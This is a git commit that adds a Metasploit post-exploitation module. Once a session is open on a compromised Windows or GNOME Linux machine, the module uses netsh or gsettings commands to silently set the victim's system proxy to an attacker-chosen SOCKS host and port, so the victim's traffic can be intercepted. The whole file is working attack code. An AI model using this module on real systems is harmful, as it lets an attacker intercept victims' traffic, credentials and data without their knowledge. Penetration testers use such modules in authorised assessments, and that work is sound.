64cfc27ca222d1d7a9cbb48d3fcdbe4abe8dd187
Eliott Teissonniere <10683430+DeveloppSoft@users.noreply.github.com>
2018-07-18 15:39:13 +0200

    First version of Local MITM

---
+++ modules/post/multi/manage/local_mitm.rb
@@ -0,0 +1,41 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Post
+  include Msf::Post::File
+  include Msf::Post::Windows::Priv
+
+  def initialize(info={})
+    super(update_info(info,
+        'Name'          => 'Free DonutZ', # GSOC 2018: module to get free modules
+        'Description'   => %q{
+          This module setup a local proxy on the victim computer so you can MITM it.
+        },
+        'License'       => MSF_LICENSE,
+        'Author'        => [ 'Eliott Teissonniere' ],
+        'Platform'      => [ 'win', 'linux' ],
+        'SessionTypes'  => [ 'meterpreter', 'shell' ]
+    ))
+
+    register_options(
+      [
+        OptString.new('RHOST', [true, 'Host of the socks proxy server']),
+        OptString.new('RPORT', [true, 'Port of the socks proxy server'])
+      ])
+  end
+
+  def run
+    if session.platform == 'windows'
+      print_status('Windows detected, using netsh')
+      vprint_status cmd_exec("netsh winhttp set proxy proxy-server=\"socks=#{datastore["RHOST"]}:#{datastore["RPORT"]}\" bypass-list=\"<local>\"")
+    else
+      print_status('Linux detected, using gsettings')
+      vprint_status cmd_exec("gsettings set org.gnome.system.proxy mode 'manual'") # tell NetworkManager there is a proxy
+      vprint_status cmd_exec("gsettings set org.gnome.system.proxy.socks port #{datastore["RPORT"]}")
+      vprint_status cmd_exec("gsettings set org.gnome.system.proxy.socks host #{datastore["RHOST"]}")
+      vprint_status cmd_exec("gsettings set org.gnome.system.proxy ignore-hosts \"['localhost', '127.0.0.0/8', '::1']\"")
+    end
+  end
+end
